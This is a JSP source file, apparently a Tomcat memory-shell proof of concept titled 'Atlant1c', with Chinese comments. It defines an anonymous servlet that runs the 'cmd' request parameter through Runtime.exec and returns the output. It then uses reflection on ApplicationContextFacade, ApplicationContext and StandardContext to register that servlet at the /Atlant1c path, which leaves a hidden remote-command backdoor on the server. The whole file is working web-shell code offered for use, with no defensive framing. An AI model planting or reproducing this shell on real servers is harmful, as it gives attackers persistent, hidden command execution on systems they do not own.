<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Atlant1c</title>
</head>
<body>
<%
    HttpServlet httpServlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            InputStream is = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
            BufferedInputStream bis = new BufferedInputStream(is);
            int len;
            while ((len = bis.read())!=-1){
                resp.getWriter().write(len);
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    };

/*    //获得StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext stdcontext = (StandardContext) req.getContext();*/

    //反射创建servletContext
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);
    //反射创建applicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);
    //反射创建standardContext
    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);

    //从StandardContext.createWapper()获得一个Wapper对象
    Wrapper newWrapper = standardContext.createWrapper();
    String name = httpServlet.getClass().getSimpleName();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(httpServlet);
    newWrapper.setServletClass(httpServlet.getClass().getName());
    //将Wrapper添加到StandardContext
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded("/Atlant1c", name);
%>